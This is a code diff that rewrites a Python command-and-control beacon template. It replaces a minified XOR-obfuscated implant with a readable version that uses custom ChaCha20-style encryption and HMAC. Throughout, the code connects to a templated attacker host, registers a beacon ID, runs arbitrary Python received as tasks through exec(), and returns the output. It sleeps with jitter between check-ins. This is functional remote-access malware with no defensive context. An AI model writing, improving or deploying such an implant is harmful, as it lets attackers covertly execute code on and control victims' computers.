@@ -1,60 +1,133 @@
-import socket as a,struct as b,zlib as c,base64 as d,random as e,time as f,json as g,sys as i,traceback as j,io as k,secrets as l,threading as t2
-_K=bytes({{XOR_KEY_BYTES}})
-_H="{{HOST}}"
-_P={{PORT}}
-_I={{INTERVAL}}
-_J={{JITTER}}
-_D=l.token_hex(8)
-_B=False
-_CK=_K
-# _T 传输钩子（U2/T6.2）: uplevel 升级代码可覆盖 _T/_H/_P/_K
-def _T():
- t=a.socket();t.settimeout(30);t.connect((_H,_P));return t
-def m(x,k):kl=len(k);return bytes(b^k[i%kl]for i,b in enumerate(x))
-def n(x):return d.b64encode(m(c.compress(x),_CK))
-def o(x):return c.decompress(m(d.b64decode(x),_CK))
-def p(s,x):q=n(x);s.sendall(b.pack(">I",len(q))+q)
-def q(s):
- r=b""
- while 4-len(r):
-  t=s.recv(4-len(r))
-  if not t:raise ConnectionError()
-  r+=t
- u=b.unpack(">I",r)[0]
- if u==0:return b""
- v=b""
- while u-len(v):
-  w=s.recv(u-len(v))
-  if not w:raise ConnectionError()
-  v+=w
- return o(v)
-_L=t2.Lock()
-def r(x):
- with _L:
-  o=k.StringIO(),k.StringIO()
-  try:i.stdout,i.stderr=o;exec(x,globals());return o[0].getvalue(),o[1].getvalue()
-  except:return o[0].getvalue(),o[1].getvalue()+j.format_exc()
-  finally:i.stdout,i.stderr=i.__stdout__,i.__stderr__
-def s():return max(5,_I+e.uniform(-_I*_J,_I*_J))
-def cyc():
- global _CK
- _CK=_K
- t=None
- try:
-  t=_T()
-  p(t,g.dumps({"type":"register","version":1,"role":"beacon","id":_D}).encode())
-  while 1:
-   u=g.loads(q(t).decode());v=u.get("type")
-   if v=="welcome":continue
-   if v in("task","init_task"):w,x=r(u["code"]);p(t,g.dumps({"type":"result","task_id":u.get("task_id",""),"output":w,"error":x}).encode())
-   elif v=="pong":break
-   elif v=="error":break
- except:pass
- finally:
-  if t is not None:
-   try:t.close()
-   except:pass
-while 1:
- if _B:break
- cyc()
- f.sleep(s())
+import socket as sock, struct as st, zlib as zl, base64 as b64, random as rnd, time as tm, json as js, sys as sy, traceback as tb, io as io_, secrets as sec, threading as thr, hashlib as hl, hmac as hmac_
+
+MASTER_KEY = bytes({{XOR_KEY_BYTES}})
+HOST = "{{HOST}}"
+PORT = {{PORT}}
+INTERVAL = {{INTERVAL}}
+JITTER = {{JITTER}}
+BEACON_ID = sec.token_hex(8)
+BREAK_FLAG = False
+CONN_KEY = MASTER_KEY
+
+# connect_transport 传输钩子（U2/T6.2）: uplevel 升级代码可覆盖 _T/_H/_P/_K
+def connect_transport():
+    conn = sock.socket()
+    conn.settimeout(30)
+    conn.connect((HOST, PORT))
+    return conn
+
+def qround(state, x, y, z, w):
+    state[x] = (state[x] + state[y]) & 0xffffffff
+    state[w] = ((state[w] ^ state[x]) << 16 | (state[w] ^ state[x]) >> 16) & 0xffffffff
+    state[z] = (state[z] + state[w]) & 0xffffffff
+    state[y] = ((state[y] ^ state[z]) << 12 | (state[y] ^ state[z]) >> 20) & 0xffffffff
+    state[x] = (state[x] + state[y]) & 0xffffffff
+    state[w] = ((state[w] ^ state[x]) << 8 | (state[w] ^ state[x]) >> 24) & 0xffffffff
+    state[z] = (state[z] + state[w]) & 0xffffffff
+    state[y] = ((state[y] ^ state[z]) << 7 | (state[y] ^ state[z]) >> 25) & 0xffffffff
+
+def block(key, nonce, counter):
+    state = [0x61707865, 0x3320646e, 0x79622d32, 0x6b206574] + list(st.unpack("<8I", key)) + [counter] + list(st.unpack("<3I", nonce))
+    work = state[:]
+    for _ in range(10):
+        qround(work, 0, 4, 8, 12); qround(work, 1, 5, 9, 13)
+        qround(work, 2, 6, 10, 14); qround(work, 3, 7, 11, 15)
+        qround(work, 0, 5, 10, 15); qround(work, 1, 6, 11, 12)
+        qround(work, 2, 7, 8, 13); qround(work, 3, 4, 9, 14)
+    return st.pack("<16I", *[(work[i] + state[i]) & 0xffffffff for i in range(16)])
+
+def xor_stream(data, key, nonce):
+    buf = bytearray()
+    counter = 0
+    for i in range(0, len(data), 64):
+        buf += bytes(u ^ v for u, v in zip(data[i:i + 64], block(key, nonce, counter)))
+        counter += 1
+    return bytes(buf)
+
+def encode_frame_(data):
+    compressed = zl.compress(data)
+    enc, mac_key = hl.sha256(b"e" + CONN_KEY).digest(), hl.sha256(b"m" + CONN_KEY).digest()
+    nonce = sec.token_bytes(12)
+    ciphertext = xor_stream(compressed, enc, nonce)
+    return b64.b64encode(nonce + ciphertext + hmac_.new(mac_key, nonce + ciphertext, hl.sha256).digest())
+
+def decode_frame_(data):
+    blob = b64.b64decode(data)
+    enc, mac_key = hl.sha256(b"e" + CONN_KEY).digest(), hl.sha256(b"m" + CONN_KEY).digest()
+    nonce, ciphertext, tag = blob[:12], blob[12:-32], blob[-32:]
+    if not hmac_.compare_digest(tag, hmac_.new(mac_key, nonce + ciphertext, hl.sha256).digest()):
+        raise ValueError("MAC")
+    return zl.decompress(xor_stream(ciphertext, enc, nonce))
+
+def send_frame(conn, data):
+    encoded = encode_frame_(data)
+    conn.sendall(st.pack(">I", len(encoded)) + encoded)
+
+def recv_frame(conn):
+    header = b""
+    while 4 - len(header):
+        chunk = conn.recv(4 - len(header))
+        if not chunk:
+            raise ConnectionError()
+        header += chunk
+    length = st.unpack(">I", header)[0]
+    if length == 0:
+        return b""
+    payload = b""
+    while length - len(payload):
+        chunk = conn.recv(length - len(payload))
+        if not chunk:
+            raise ConnectionError()
+        payload += chunk
+    return decode_frame_(payload)
+
+PRINT_LOCK = thr.Lock()
+
+def exec_task(code):
+    with PRINT_LOCK:
+        buffers = io_.StringIO(), io_.StringIO()
+        try:
+            sy.stdout, sy.stderr = buffers
+            exec(code, globals())
+            return buffers[0].getvalue(), buffers[1].getvalue()
+        except Exception:
+            return buffers[0].getvalue(), buffers[1].getvalue() + tb.format_exc()
+        finally:
+            sy.stdout, sy.stderr = sy.__stdout__, sy.__stderr__
+
+def sleep_jitter():
+    return max(5, INTERVAL + rnd.uniform(-INTERVAL * JITTER, INTERVAL * JITTER))
+
+def cycle():
+    global CONN_KEY
+    CONN_KEY = MASTER_KEY
+    conn = None
+    try:
+        conn = connect_transport()
+        send_frame(conn, js.dumps({"type": "register", "version": 1, "role": "beacon", "id": BEACON_ID}).encode())
+        while True:
+            msg = js.loads(recv_frame(conn).decode())
+            mtype = msg.get("type")
+            if mtype == "welcome":
+                continue
+            if mtype in ("task", "init_task"):
+                out, err = exec_task(msg["code"])
+                send_frame(conn, js.dumps({"type": "result", "task_id": msg.get("task_id", ""), "output": out, "error": err}).encode())
+            elif mtype == "pong":
+                break
+            elif mtype == "error":
+                break
+    except Exception:
+        pass
+    finally:
+        if conn is not None:
+            try:
+                conn.close()
+            except Exception:
+                pass
+
+while True:
+    if BREAK_FLAG:
+        break
+    cycle()
+    tm.sleep(sleep_jitter())
